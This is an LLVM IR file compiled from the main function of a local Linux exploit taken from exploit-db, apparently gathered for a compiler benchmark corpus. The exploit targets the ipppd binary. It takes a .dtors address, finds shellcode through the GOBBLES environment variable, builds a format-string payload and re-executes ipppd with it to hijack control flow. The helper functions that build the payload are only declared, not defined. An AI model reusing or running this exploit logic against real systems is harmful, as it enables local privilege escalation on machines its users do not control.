; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_21700.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_21700.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [141 x i8] c"\0AUsage: \0A%s -t <.dtors address>\0A\0AOptional:\0A\09-o <word offset>\0A\09-a <allignment>\0A\0AFor the lazy:\0A\09-g spits out .dtors section (use standalone)\0A\0A\00", align 1
@ALLIGN = common dso_local global i32 0, align 4
@DPA = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [8 x i8] c"t:o:a:g\00", align 1
@EOF = common dso_local global i8 0, align 1
@optarg = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [3 x i8] c"%p\00", align 1
@.str.3 = private unnamed_addr constant [56 x i8] c"[*] requested objdump, this will halt any exploitation\0A\00", align 1
@OBJDUMP = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [8 x i8] c"objdump\00", align 1
@.str.5 = private unnamed_addr constant [3 x i8] c"-s\00", align 1
@.str.6 = private unnamed_addr constant [3 x i8] c"-j\00", align 1
@.str.7 = private unnamed_addr constant [7 x i8] c".dtors\00", align 1
@IPPPD = common dso_local global i8* null, align 8
@.str.8 = private unnamed_addr constant [47 x i8] c"[*] error getting .dtors section, check paths\0A\00", align 1
@.str.9 = private unnamed_addr constant [18 x i8] c"hehehe ;PppPPPpP\0A\00", align 1
@.str.10 = private unnamed_addr constant [8 x i8] c"GOBBLES\00", align 1
@environ = common dso_local global i32 0, align 4
@.str.11 = private unnamed_addr constant [24 x i8] c"[*] error re-executing\0A\00", align 1
@.str.12 = private unnamed_addr constant [36 x i8] c"[*] target @ %p\0A[*] shellcode @ %p\0A\00", align 1
@.str.13 = private unnamed_addr constant [6 x i8] c"ipppd\00", align 1
@string = common dso_local global i32 0, align 4
@.str.14 = private unnamed_addr constant [21 x i8] c"[*] error executing\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i8*, align 8
  %11 = alloca i64, align 8
  %12 = alloca i64, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %8, align 4
  %13 = load i32, i32* %4, align 4
  %14 = icmp eq i32 %13, 1
  br i1 %14, label %15, label %22

15:                                               ; preds = %2
  %16 = load i32, i32* @stderr, align 4
  %17 = load i8**, i8*** %5, align 8
  %18 = getelementptr inbounds i8*, i8** %17, i64 0
  %19 = load i8*, i8** %18, align 8
  %20 = call i32 (i32, i8*, ...) @fprintf(i32 %16, i8* getelementptr inbounds ([141 x i8], [141 x i8]* @.str, i64 0, i64 0), i8* %19)
  %21 = call i32 @exit(i32 0) #3
  unreachable

22:                                               ; preds = %2
  %23 = load i32, i32* @ALLIGN, align 4
  store i32 %23, i32* %7, align 4
  %24 = load i32, i32* @DPA, align 4
  store i32 %24, i32* %6, align 4
  br label %25

25:                                               ; preds = %67, %22
  %26 = load i32, i32* %4, align 4
  %27 = load i8**, i8*** %5, align 8
  %28 = call signext i8 @getopt(i32 %26, i8** %27, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i64 0, i64 0))
  store i8 %28, i8* %9, align 1
  %29 = sext i8 %28 to i32
  %30 = load i8, i8* @EOF, align 1
  %31 = sext i8 %30 to i32
  %32 = icmp ne i32 %29, %31
  br i1 %32, label %33, label %68

33:                                               ; preds = %25
  %34 = load i8, i8* %9, align 1
  %35 = sext i8 %34 to i32
  switch i32 %35, label %63 [
    i32 116, label %36
    i32 97, label %43
    i32 111, label %46
    i32 103, label %49
  ]

36:                                               ; preds = %33
  %37 = load i32, i32* @optarg, align 4
  %38 = call i32 @sscanf(i32 %37, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i64 0, i64 0), i8** %10)
  %39 = load i8*, i8** %10, align 8
  %40 = ptrtoint i8* %39 to i64
  store i64 %40, i64* %11, align 8
  %41 = load i64, i64* %11, align 8
  %42 = add i64 %41, 4
  store i64 %42, i64* %11, align 8
  br label %67

43:                                               ; preds = %33
  %44 = load i32, i32* @optarg, align 4
  %45 = call i32 @atoi(i32 %44)
  store i32 %45, i32* %7, align 4
  br label %67

46:                                               ; preds = %33
  %47 = load i32, i32* @optarg, align 4
  %48 = call i32 @atoi(i32 %47)
  store i32 %48, i32* %6, align 4
  br label %67

49:                                               ; preds = %33
  %50 = load i32, i32* @stderr, align 4
  %51 = call i32 (i32, i8*, ...) @fprintf(i32 %50, i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.3, i64 0, i64 0))
  %52 = load i32, i32* @OBJDUMP, align 4
  %53 = sext i32 %52 to i64
  %54 = inttoptr i64 %53 to i8*
  %55 = load i8*, i8** @IPPPD, align 8
  %56 = call i64 (i8*, i8*, i8*, i8*, ...) @execl(i8* %54, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.4, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.6, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.7, i64 0, i64 0), i8* %55, i8* null)
  %57 = icmp ne i64 %56, 0
  br i1 %57, label %58, label %62

58:                                               ; preds = %49
  %59 = load i32, i32* @stderr, align 4
  %60 = call i32 (i32, i8*, ...) @fprintf(i32 %59, i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.8, i64 0, i64 0))
  %61 = call i32 @exit(i32 1) #3
  unreachable

62:                                               ; preds = %49
  br label %63

63:                                               ; preds = %33, %62
  %64 = load i32, i32* @stderr, align 4
  %65 = call i32 (i32, i8*, ...) @fprintf(i32 %64, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.9, i64 0, i64 0))
  %66 = call i32 @exit(i32 0) #3
  unreachable

67:                                               ; preds = %46, %43, %36
  br label %25

68:                                               ; preds = %25
  store i8* null, i8** %10, align 8
  %69 = call i8* @getenv(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.10, i64 0, i64 0))
  store i8* %69, i8** %10, align 8
  %70 = icmp eq i8* %69, null
  br i1 %70, label %71, label %85

71:                                               ; preds = %68
  %72 = call i32 (...) @stuff()
  %73 = load i8**, i8*** %5, align 8
  %74 = getelementptr inbounds i8*, i8** %73, i64 0
  %75 = load i8*, i8** %74, align 8
  %76 = load i8**, i8*** %5, align 8
  %77 = load i32, i32* @environ, align 4
  %78 = call i64 @execve(i8* %75, i8** %76, i32 %77)
  %79 = icmp ne i64 %78, 0
  br i1 %79, label %80, label %84

80:                                               ; preds = %71
  %81 = load i32, i32* @stderr, align 4
  %82 = call i32 (i32, i8*, ...) @fprintf(i32 %81, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.11, i64 0, i64 0))
  %83 = call i32 @exit(i32 1) #3
  unreachable

84:                                               ; preds = %71
  br label %85

85:                                               ; preds = %84, %68
  %86 = load i8*, i8** %10, align 8
  %87 = ptrtoint i8* %86 to i64
  store i64 %87, i64* %12, align 8
  %88 = load i8**, i8*** %5, align 8
  %89 = getelementptr inbounds i8*, i8** %88, i64 0
  %90 = load i8*, i8** %89, align 8
  %91 = call i32 @strlen(i8* %90)
  %92 = load i8*, i8** @IPPPD, align 8
  %93 = call i32 @strlen(i8* %92)
  %94 = sub nsw i32 %91, %93
  store i32 %94, i32* %8, align 4
  %95 = load i32, i32* %8, align 4
  %96 = sext i32 %95 to i64
  %97 = load i64, i64* %12, align 8
  %98 = add i64 %97, %96
  store i64 %98, i64* %12, align 8
  %99 = load i32, i32* @stderr, align 4
  %100 = load i64, i64* %11, align 8
  %101 = load i64, i64* %12, align 8
  %102 = call i32 (i32, i8*, ...) @fprintf(i32 %99, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.12, i64 0, i64 0), i64 %100, i64 %101)
  %103 = load i64, i64* %11, align 8
  %104 = load i64, i64* %12, align 8
  %105 = load i32, i32* %6, align 4
  %106 = load i32, i32* %7, align 4
  %107 = call i32 @buildstring(i64 %103, i64 %104, i32 %105, i32 %106)
  %108 = load i8*, i8** @IPPPD, align 8
  %109 = load i32, i32* @string, align 4
  %110 = sext i32 %109 to i64
  %111 = inttoptr i64 %110 to i8*
  %112 = call i64 (i8*, i8*, i8*, i8*, ...) @execl(i8* %108, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.13, i64 0, i64 0), i8* %111, i8* null)
  %113 = icmp ne i64 %112, 0
  br i1 %113, label %114, label %118

114:                                              ; preds = %85
  %115 = load i32, i32* @stderr, align 4
  %116 = call i32 (i32, i8*, ...) @fprintf(i32 %115, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.14, i64 0, i64 0))
  %117 = call i32 @exit(i32 1) #3
  unreachable

118:                                              ; preds = %85
  %119 = load i32, i32* %3, align 4
  ret i32 %119
}

declare dso_local i32 @fprintf(i32, i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local signext i8 @getopt(i32, i8**, i8*) #1

declare dso_local i32 @sscanf(i32, i8*, i8**) #1

declare dso_local i32 @atoi(i32) #1

declare dso_local i64 @execl(i8*, i8*, i8*, i8*, ...) #1

declare dso_local i8* @getenv(i8*) #1

declare dso_local i32 @stuff(...) #1

declare dso_local i64 @execve(i8*, i8**, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @buildstring(i64, i64, i32, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
